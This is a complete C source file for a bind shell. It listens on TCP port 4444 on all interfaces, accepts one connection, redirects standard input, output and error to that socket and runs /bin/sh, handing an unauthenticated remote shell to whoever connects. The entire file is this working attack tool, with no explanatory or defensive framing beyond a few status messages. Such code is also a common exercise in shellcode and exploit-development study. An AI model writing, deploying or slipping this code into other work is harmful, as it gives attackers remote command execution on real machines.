#include <netinet/in.h>
#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#define PORT 4444
#define EXE "/bin/sh"

int main()
{
	int sockfd;
	int connection;
	struct sockaddr_in addr;
	socklen_t addrlen = sizeof(struct sockaddr_in);

	char * argv2[] = {EXE, (char * const)NULL};
	char * envp2[] = {NULL};

	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = INADDR_ANY;
	addr.sin_port = htons(PORT);

	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	bind(sockfd, (struct sockaddr *)&addr, addrlen);
	
	listen(sockfd, 1);
	printf("{+] Listening\n");

	connection = accept(sockfd,(struct sockaddr *)&addr, &addrlen);
	printf("[+] Connection accepted\n");

	close(sockfd);
	dup2(connection, STDOUT_FILENO);
	dup2(connection, STDERR_FILENO);
	dup2(connection, STDIN_FILENO);

	execve(EXE, argv2, argv2);

	printf("[+] Done\n");
	return 0;
}
